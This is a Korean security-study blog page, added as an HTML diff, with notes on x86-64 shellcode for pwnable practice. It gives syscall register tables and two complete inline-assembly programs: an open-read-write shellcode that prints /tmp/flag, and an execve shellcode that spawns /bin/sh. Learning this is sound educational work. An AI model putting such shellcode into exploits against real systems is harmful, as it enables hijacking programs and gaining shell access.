@@ -1,0 +1,181 @@
+<!DOCTYPE html><html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#0e0e10"><link rel="icon" type="image/png" href="/favicon.png"><link rel="stylesheet" href="/_astro/fonts.CLaWOyno.css" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="/_astro/fonts.CLaWOyno.css"></noscript><meta name="description" content="Exploit을 위해 제작된 Assembly 코드 조각 - Shell: OS에 명령을 내리기 위해 사용되는 user interface - Kernal: OS의 핵심 기능 - execve shellcode: 임의의 프로그램을 실행하는 shellcode 원문:…"><link rel="alternate" type="application/rss+xml" title="kirin" href="/rss.xml"><link rel="sitemap" href="/sitemap.xml"><title>Shellcode | kirin</title><style>.ls[data-astro-cid-i36apd2x]{font-family:var(--font-mono);font-size:var(--text-sm);margin:0;padding:0;list-style:none}li[data-astro-cid-i36apd2x]{gap:var(--space-4);padding:var(--space-1) var(--space-3);border-left:2px solid #0000;grid-template-columns:10ch 10ch 9ch minmax(0,1fr) auto;align-items:baseline;display:grid}.no-kind[data-astro-cid-i36apd2x] li[data-astro-cid-i36apd2x]{grid-template-columns:10ch 10ch minmax(0,1fr) auto}li[data-astro-cid-i36apd2x]:hover,li[data-astro-cid-i36apd2x]:focus-within{background:var(--panel);border-left-color:var(--gold)}.perm[data-astro-cid-i36apd2x],time[data-astro-cid-i36apd2x]{color:var(--muted)}.locked[data-astro-cid-i36apd2x] .perm[data-astro-cid-i36apd2x]{color:var(--vermilion)}.kind[data-astro-cid-i36apd2x]{color:var(--celadon)}a[data-astro-cid-i36apd2x]{font-family:var(--font-sans);font-size:var(--text-base);color:var(--ink);text-decoration:none}a[data-astro-cid-i36apd2x]:hover{color:var(--gold);text-decoration:underline}.lock[data-astro-cid-i36apd2x]{margin-left:var(--space-2);font-size:var(--text-xs);color:var(--vermilion)}.tags[data-astro-cid-i36apd2x]{color:var(--muted);text-align:right}.empty[data-astro-cid-i36apd2x]{font-family:var(--font-mono);font-size:var(--text-sm);color:var(--muted)}@media (width<=48rem){li[data-astro-cid-i36apd2x],.no-kind[data-astro-cid-i36apd2x] li[data-astro-cid-i36apd2x]{gap:0 var(--space-3);grid-template-columns:auto auto 1fr}.perm[data-astro-cid-i36apd2x]{display:none}a[data-astro-cid-i36apd2x]{grid-column:1/-1}.tags[data-astro-cid-i36apd2x]{text-align:left;grid-column:1/-1}}
+</style><link rel="stylesheet" href="/_astro/_..CotCdawi.css"><style>.site-header[data-astro-cid-nen7h5rs]{align-items:center;gap:var(--space-6);padding:var(--space-4) 0;margin-bottom:var(--space-8);border-bottom:1px solid var(--line);grid-template-columns:auto minmax(0,1fr) auto;display:grid}.brand[data-astro-cid-nen7h5rs]{align-items:center;gap:var(--space-3);color:var(--ink);font-family:var(--font-mono);font-weight:600;text-decoration:none;display:flex}.path[data-astro-cid-nen7h5rs]{font-family:var(--font-mono);font-size:var(--text-sm);color:var(--muted);white-space:nowrap;text-overflow:ellipsis;margin:0;overflow:hidden}.who[data-astro-cid-nen7h5rs]{color:var(--gold)}.where[data-astro-cid-nen7h5rs]{color:var(--celadon)}ul[data-astro-cid-nen7h5rs]{gap:var(--space-1) var(--space-4);font-size:var(--text-sm);flex-wrap:wrap;margin:0;padding:0;list-style:none;display:flex}nav[data-astro-cid-nen7h5rs] a[data-astro-cid-nen7h5rs]{color:var(--muted);text-decoration:none}nav[data-astro-cid-nen7h5rs] a[data-astro-cid-nen7h5rs]:hover,nav[data-astro-cid-nen7h5rs] a[data-astro-cid-nen7h5rs][aria-current=page]{color:var(--ink);text-decoration:underline}@media (width<=48rem){.site-header[data-astro-cid-nen7h5rs]{grid-template-columns:auto 1fr}@media (width<=40rem){.site-header[data-astro-cid-nen7h5rs]{gap:var(--space-3);grid-template-columns:1fr}nav[data-astro-cid-nen7h5rs]{justify-self:start}ul[data-astro-cid-nen7h5rs]{gap:var(--space-1) var(--space-3)}}.path[data-astro-cid-nen7h5rs]{display:none}nav[data-astro-cid-nen7h5rs]{justify-self:end}}:root{color-scheme:dark;--bg:#0e0e10;--panel:#17171a;--line:#2b2b30;--ink:#e8e3d4;--muted:#a0a0a8;--gold:#e2b24c;--celadon:#6fb08c;--vermilion:#e2705a;--cloud:#f4efe2;--font-mono:"IBM Plex Mono", "IBM Plex Sans KR", ui-monospace, monospace;--font-sans:"IBM Plex Sans KR", system-ui, sans-serif;--text-xs:.8rem;--text-sm:.875rem;--text-base:1.0625rem;--text-lg:1.33rem;--text-xl:1.66rem;--text-2xl:2.3rem;--measure:68ch;--space-1:.25rem;--space-2:.5rem;--space-3:.75rem;--space-4:1rem;--space-6:1.5rem;--space-8:2rem;--space-12:3rem;--space-16:4rem;--space-24:6rem;--radius:6px;--duration:.14s}*,:before,:after{box-sizing:border-box}html{-webkit-text-size-adjust:100%}body{background:var(--bg);color:var(--ink);font:400 var(--text-base) / 1.7 var(--font-sans);word-break:keep-all;overflow-wrap:break-word;margin:0}a{color:var(--gold);text-underline-offset:.2em;text-decoration-thickness:1px}a:hover{text-decoration-thickness:2px}:focus-visible{outline:2px solid var(--gold);outline-offset:2px}::selection{background:var(--gold);color:var(--bg)}h1,h2,h3{margin:0;font-weight:600;line-height:1.3}code,kbd,samp,pre{font-family:var(--font-mono);font-size:.92em}:not(pre)>code{background:var(--panel);border:1px solid var(--line);border-radius:4px;padding:.05em .3em}.sr-only{clip-path:inset(50%);white-space:nowrap;width:1px;height:1px;position:absolute;overflow:hidden}.sr-only:focus{top:var(--space-2);left:var(--space-2);clip-path:none;width:auto;height:auto;padding:var(--space-2) var(--space-3);background:var(--panel);z-index:10;position:fixed}.page{max-width:76rem;padding:0 var(--space-4) var(--space-16);margin:0 auto}.prompt{font-family:var(--font-mono);font-size:var(--text-sm);color:var(--ink);font-weight:400}.prompt .who{color:var(--gold)}.prompt .where{color:var(--celadon)}.prompt .sigil{color:var(--muted);margin-right:.6ch}@media (prefers-reduced-motion:reduce){*,:before,:after{transition:none!important;animation:none!important}}
+</style></head><body><a class="sr-only" href="#main">본문으로 건너뛰기</a><div class="page"><header class="site-header" data-astro-cid-nen7h5rs><a class="brand" href="/" aria-label="kirin 홈" data-astro-cid-nen7h5rs><img src="/_astro/kirin-avatar.C3aIZXQV_Z2rVrcY.webp" srcset="/_astro/kirin-avatar.C3aIZXQV_Z2rVrcY.webp 1x, /_astro/kirin-avatar.C3aIZXQV_Ztxad8.webp 2x" alt data-astro-cid-nen7h5rs="true" loading="lazy" decoding="async" width="40" height="40"><span data-astro-cid-nen7h5rs>kirin</span></a><p class="path" aria-hidden="true" data-astro-cid-nen7h5rs><span class="who" data-astro-cid-nen7h5rs>kirin@pwnlab</span>:<span class="where" data-astro-cid-nen7h5rs>~/notes/shellcode</span>$</p><nav aria-label="주요 메뉴" data-astro-cid-nen7h5rs><ul data-astro-cid-nen7h5rs><li data-astro-cid-nen7h5rs><a href="/writeups/" data-astro-cid-nen7h5rs>Writeups</a></li><li data-astro-cid-nen7h5rs><a href="/cve/" data-astro-cid-nen7h5rs>CVE</a></li><li data-astro-cid-nen7h5rs><a href="/notes/" aria-current="page" data-astro-cid-nen7h5rs>Notes</a></li><li data-astro-cid-nen7h5rs><a href="/projects/" data-astro-cid-nen7h5rs>Projects</a></li><li data-astro-cid-nen7h5rs><a href="/search/" data-astro-cid-nen7h5rs>Search</a></li><li data-astro-cid-nen7h5rs><a href="/about/" data-astro-cid-nen7h5rs>About</a></li></ul></nav></header><main id="main"><article class="post" data-pagefind-body data-astro-cid-g5songws><header data-astro-cid-g5songws><div data-pagefind-ignore data-astro-cid-g5songws><p class="prompt"><span class="who">kirin@pwnlab</span>:<span class="where">~/notes</span><span class="sigil">$</span>cat shellcode.md</p></div><h1 data-astro-cid-g5songws>Shellcode</h1><p class="kind" data-pagefind-ignore data-astro-cid-g5songws><a href="/notes/" data-pagefind-filter="kind" data-astro-cid-g5songws>Notes</a></p><dl class="meta" data-pagefind-ignore data-astro-cid-g5songws><div data-astro-cid-g5songws><dt data-astro-cid-g5songws>date</dt><dd data-astro-cid-g5songws>2026-08-05</dd></div><div data-astro-cid-g5songws><dt data-astro-cid-g5songws>tags</dt><dd data-astro-cid-g5songws>shellcode</dd></div></dl></header><aside class="toc" data-pagefind-ignore data-astro-cid-g5songws><nav class="toc" aria-labelledby="toc-title" data-toc data-astro-cid-7k3pnqyz><details data-toc-details data-astro-cid-7k3pnqyz><summary data-astro-cid-7k3pnqyz><p class="prompt" id="toc-title"><span class="who">kirin@pwnlab</span>:<span class="where">~/notes</span><span class="sigil">$</span>grep -n &#39;^#&#39; shellcode.md<span class="sr-only" data-astro-cid-7k3pnqyz>목차</span></p><span class="count" data-astro-cid-7k3pnqyz>(7)</span></summary><ol data-astro-cid-7k3pnqyz><li class="d2" data-astro-cid-7k3pnqyz><a href="#definition" data-astro-cid-7k3pnqyz><span class="ln" aria-hidden="true" data-astro-cid-7k3pnqyz>  7</span><span class="t" data-astro-cid-7k3pnqyz>Definition</span></a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#orw-shellcode" data-astro-cid-7k3pnqyz><span class="ln" aria-hidden="true" data-astro-cid-7k3pnqyz> 10</span><span class="t" data-astro-cid-7k3pnqyz>orw shellcode</span></a></li><li class="d3" data-astro-cid-7k3pnqyz><a href="#read" data-astro-cid-7k3pnqyz><span class="ln" aria-hidden="true" data-astro-cid-7k3pnqyz> 26</span><span class="t" data-astro-cid-7k3pnqyz>read</span></a></li><li class="d3" data-astro-cid-7k3pnqyz><a href="#write" data-astro-cid-7k3pnqyz><span class="ln" aria-hidden="true" data-astro-cid-7k3pnqyz> 35</span><span class="t" data-astro-cid-7k3pnqyz>write</span></a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#orw-assembly-shellcode-c--inline-asm" data-astro-cid-7k3pnqyz><span class="ln" aria-hidden="true" data-astro-cid-7k3pnqyz> 45</span><span class="t" data-astro-cid-7k3pnqyz>ORW Assembly Shellcode (C + Inline ASM)</span></a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#execve-shellcode" data-astro-cid-7k3pnqyz><span class="ln" aria-hidden="true" data-astro-cid-7k3pnqyz> 87</span><span class="t" data-astro-cid-7k3pnqyz>execve shellcode</span></a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#execve-assembly-shellcode-c--inline-asm" data-astro-cid-7k3pnqyz><span class="ln" aria-hidden="true" data-astro-cid-7k3pnqyz>100</span><span class="t" data-astro-cid-7k3pnqyz>execve Assembly Shellcode (C + Inline ASM)</span></a></li></ol></details></nav><script>
+  // is:inline keeps this in the page, so on protected posts it is encrypted with it
+  // instead of becoming a separate unencrypted /_astro/*.js file.
+  // Runs after parsing: the headings come after this script and the page height must be final.
+  // (Protected posts are written in by staticrypt after load, so also handle an already-parsed document.)
+  const init = () => {
+    const nav = document.querySelector('[data-toc]');
+    if (!nav) return;
+    // The desktop column is always open; on mobile the list starts collapsed.
+    const details = nav.querySelector('[data-toc-details]');
+    const desktop = matchMedia('(min-width: 64rem)');
+    const sync = () => (details.open = desktop.matches);
+    desktop.addEventListener('change', sync);
+    sync();
+
+    // Mark the last heading that has scrolled past the top of the viewport.
+    const links = [...nav.querySelectorAll('a[href^="#"]')];
+    const targets = links.map((a) => document.getElementById(decodeURIComponent(a.hash.slice(1))));
+    const TOP = 120;
+    let queued = false;
+    const update = () => {
+      queued = false;
+      let active = 0;
+      targets.forEach((el, i) => {
+        if (el && el.getBoundingClientRect().top <= TOP) active = i;
+      });
+      // Short last sections never reach the top; at the bottom of the page the last one is the one being read.
+      if (innerHeight + scrollY >= document.documentElement.scrollHeight - 2) active = targets.length - 1;
+      links.forEach((a, i) => (i === active ? a.setAttribute('aria-current', 'location') : a.removeAttribute('aria-current')));
+    };
+    addEventListener('scroll', () => {
+      if (queued) return;
+      queued = true;
+      requestAnimationFrame(update);
+    }, { passive: true });
+    update();
+  };
+  if (document.readyState === 'loading') addEventListener('DOMContentLoaded', init);
+  else init();
+</script></aside><div class="body" data-astro-cid-g5songws><h2 id="definition">Definition</h2>
+<p>Exploit을 위해 제작된 Assembly 코드 조각</p>
+<h2 id="orw-shellcode">orw shellcode</h2>
+<div class="expressive-code"><link rel="stylesheet" href="/_astro/ec.t2nri.css"><script type="module" src="/_astro/ec.0vx5m.js"></script><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c"><code><div class="ec-line"><div class="code"><span style="--0:#7FC8D6">char</span><span style="--0:#E8E3D4"> buf[0x</span><span style="--0:#F0C674">30</span><span style="--0:#E8E3D4">];</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#7FC8D6">int</span><span style="--0:#E8E3D4"> fd = </span><span style="--0:#E2B24C">open</span><span style="--0:#E8E3D4">(</span><span style="--0:#8FCFA6">"/tmp/flag"</span><span style="--0:#E8E3D4">, O_RDONLY, </span><span style="--0:#F0C674">0</span><span style="--0:#E8E3D4">);</span></div></div><div class="ec-line"><div class="code"><span style="--0:#E2B24C">read</span><span style="--0:#E8E3D4">(fd, buf, 0x</span><span style="--0:#F0C674">30</span><span style="--0:#E8E3D4">);</span></div></div><div class="ec-line"><div class="code"><span style="--0:#E2B24C">write</span><span style="--0:#E8E3D4">(</span><span style="--0:#F0C674">1</span><span style="--0:#E8E3D4">, buf, 0x</span><span style="--0:#F0C674">30</span><span style="--0:#E8E3D4">);</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="char buf[0x30];int fd = open(&quot;/tmp/flag&quot;, O_RDONLY, 0);read(fd, buf, 0x30);write(1, buf, 0x30);"><div></div></button></div></figure></div>
+<table>
+<thead>
+<tr>
+<th>syscall</th>
+<th>rax</th>
+<th>arg0 (rdi)</th>
+<th>arg1 (rsi)</th>
+<th>arg2 (rdx)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>read</td>
+<td>0x00</td>
+<td>unsigned int fd</td>
+<td>char *buf</td>
+<td>size_t count</td>
+</tr>
+<tr>
+<td>write</td>
+<td>0x01</td>
+<td>unsigned int fd</td>
+<td>const char *buf</td>
+<td>size_t count</td>
+</tr>
+<tr>
+<td>open</td>
+<td>0x02</td>
+<td>const char *filename</td>
+<td>int flags</td>
+<td>umode_t mode</td>
+</tr>
+</tbody>
+</table>
+<h3 id="read">read</h3>
+<table>
+<thead>
+<tr>
+<th>register</th>
+<th>의미</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>rax</td>
+<td>0 (sys_read)</td>
+</tr>
+<tr>
+<td>rdi</td>
+<td>file descriptor</td>
+</tr>
+<tr>
+<td>rsi</td>
+<td>buffer address</td>
+</tr>
+<tr>
+<td>rdx</td>
+<td>읽을 바이트 수</td>
+</tr>
+</tbody>
+</table>
+<h3 id="write">write</h3>
+<table>
+<thead>
+<tr>
+<th>register</th>
+<th>의미</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>rax</td>
+<td>1 (sys_write)</td>
+</tr>
+<tr>
+<td>rdi</td>
+<td>file descriptor</td>
+</tr>
+<tr>
+<td>rsi</td>
+<td>buffer address</td>
+</tr>
+<tr>
+<td>rdx</td>
+<td>출력할 바이트 수</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="orw-assembly-shellcode-c--inline-asm">ORW Assembly Shellcode (C + Inline ASM)</h2>
+<div class="expressive-code"><figure class="frame has-title"><figcaption class="header"><span class="title">orw.c</span></figcaption><pre data-language="c"><code><div class="ec-line"><div class="code"><span style="--0:#8E8E97">// Compile: gcc -o orw orw.c -masm=intel</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#7FC8D6">__asm__</span><span style="--0:#E8E3D4">(</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">.global run_sh\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">run_sh:\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">push 0x67\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rax, 0x616c662f706d742f \n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">push rax\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rdi, rsp\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">      // rdi = "/tmp/flag"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">xor rsi, rsi\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">      // rsi = 0 ; O_RDONLY</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">xor rdx, rdx\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">      // rdx = 0</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rax, 2\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">        // rax = syscall_open</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">syscall\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rdi, rax\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">      // rdi = fd</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rsi, rsp\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">sub rsi, 0x30\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">     // buffer = rsp - 0x30</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rdx, 0x30\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">     // length = 0x30</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rax, 0\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">        // syscall_read</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">syscall\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rdi, 1\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">        // stdout</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rax, 1\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">        // syscall_write</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">syscall\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">xor rdi, rdi\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rax, 0x3c\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">     // syscall_exit</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">syscall\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code"><span style="--0:#E8E3D4">);</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#7FC8D6">void</span><span style="--0:#E8E3D4"> </span><span style="--0:#E2B24C">run_sh</span><span style="--0:#E8E3D4">();</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#7FC8D6">int</span><span style="--0:#E8E3D4"> </span><span style="--0:#E2B24C">main</span><span style="--0:#E8E3D4">() {</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#E2B24C">run_sh</span><span style="--0:#E8E3D4">();</span></div></div><div class="ec-line"><div class="code"><span style="--0:#E8E3D4">}</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="// Compile: gcc -o orw orw.c -masm=intel__asm__(    &quot;.global run_sh\n&quot;    &quot;run_sh:\n&quot;    &quot;push 0x67\n&quot;    &quot;mov rax, 0x616c662f706d742f \n&quot;    &quot;push rax\n&quot;    &quot;mov rdi, rsp\n&quot;      // rdi = &quot;/tmp/flag&quot;    &quot;xor rsi, rsi\n&quot;      // rsi = 0 ; O_RDONLY    &quot;xor rdx, rdx\n&quot;      // rdx = 0    &quot;mov rax, 2\n&quot;        // rax = syscall_open    &quot;syscall\n&quot;    &quot;mov rdi, rax\n&quot;      // rdi = fd    &quot;mov rsi, rsp\n&quot;    &quot;sub rsi, 0x30\n&quot;     // buffer = rsp - 0x30    &quot;mov rdx, 0x30\n&quot;     // length = 0x30    &quot;mov rax, 0\n&quot;        // syscall_read    &quot;syscall\n&quot;    &quot;mov rdi, 1\n&quot;        // stdout    &quot;mov rax, 1\n&quot;        // syscall_write    &quot;syscall\n&quot;    &quot;xor rdi, rdi\n&quot;    &quot;mov rax, 0x3c\n&quot;     // syscall_exit    &quot;syscall\n&quot;);void run_sh();int main() {    run_sh();}"><div></div></button></div></figure></div>
+<h2 id="execve-shellcode">execve shellcode</h2>
+<ul>
+<li>Shell: OS에 명령을 내리기 위해 사용되는 user interface</li>
+<li>Kernal: OS의 핵심 기능</li>
+<li>execve shellcode: 임의의 프로그램을 실행하는 shellcode</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>syscall</th>
+<th>rax</th>
+<th>arg0 (rdi)</th>
+<th>arg1 (rsi)</th>
+<th>arg2 (rdx)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>execve</td>
+<td>0x3b</td>
+<td>const char *filename</td>
+<td>const char *const *argv</td>
+<td>const char *const *envp</td>
+</tr>
+</tbody>
+</table>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c"><code><div class="ec-line"><div class="code"><span style="--0:#E2B24C">execve</span><span style="--0:#E8E3D4">(</span><span style="--0:#8FCFA6">"/bin/sh"</span><span style="--0:#E8E3D4">, </span><span style="--0:#F0C674">NULL</span><span style="--0:#E8E3D4">, </span><span style="--0:#F0C674">NULL</span><span style="--0:#E8E3D4">);</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="execve(&quot;/bin/sh&quot;, NULL, NULL);"><div></div></button></div></figure></div>
+<h2 id="execve-assembly-shellcode-c--inline-asm">execve Assembly Shellcode (C + Inline ASM)</h2>
+<div class="expressive-code"><figure class="frame has-title"><figcaption class="header"><span class="title">execve.c</span></figcaption><pre data-language="c"><code><div class="ec-line"><div class="code"><span style="--0:#8E8E97">// Compile: gcc -o execve execve.c -masm=intel</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#7FC8D6">__asm__</span><span style="--0:#E8E3D4">(</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">.global run_sh\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">run_sh:\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rax, 0x68732f6e69622f\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">push rax\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rdi, rsp\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">     // rdi = "/bin/sh"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">xor rsi, rsi\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">     // rsi = NULL</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">xor rdx, rdx\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">     // rdx = NULL</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rax, 0x3b\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">    // syscall execve</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">syscall\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">xor rdi, rdi\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">mov rax, 0x3c\n</span><span style="--0:#8FCFA6">"</span><span style="--0:#8E8E97">    // syscall exit</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#8FCFA6">"</span><span style="--0:#8FCFA6">syscall\n</span><span style="--0:#8FCFA6">"</span></div></div><div class="ec-line"><div class="code"><span style="--0:#E8E3D4">);</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#7FC8D6">void</span><span style="--0:#E8E3D4"> </span><span style="--0:#E2B24C">run_sh</span><span style="--0:#E8E3D4">();</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#7FC8D6">int</span><span style="--0:#E8E3D4"> </span><span style="--0:#E2B24C">main</span><span style="--0:#E8E3D4">() {</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#E2B24C">run_sh</span><span style="--0:#E8E3D4">();</span></div></div><div class="ec-line"><div class="code"><span style="--0:#E8E3D4">}</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="// Compile: gcc -o execve execve.c -masm=intel__asm__(    &quot;.global run_sh\n&quot;    &quot;run_sh:\n&quot;    &quot;mov rax, 0x68732f6e69622f\n&quot;    &quot;push rax\n&quot;    &quot;mov rdi, rsp\n&quot;     // rdi = &quot;/bin/sh&quot;    &quot;xor rsi, rsi\n&quot;     // rsi = NULL    &quot;xor rdx, rdx\n&quot;     // rdx = NULL    &quot;mov rax, 0x3b\n&quot;    // syscall execve    &quot;syscall\n&quot;    &quot;xor rdi, rdi\n&quot;    &quot;mov rax, 0x3c\n&quot;    // syscall exit    &quot;syscall\n&quot;);void run_sh();int main() {    run_sh();}"><div></div></button></div></figure></div>
+<hr>
+<p>원문: <a href="https://github.com/danielcho02/pwnable_lab/blob/HEAD/pwnable/system_hacking_fundamental/shellcode/README.md">pwnable_lab/pwnable/system_hacking_fundamental/shellcode/README.md</a></p>
+</div></article></main></div></body></html>
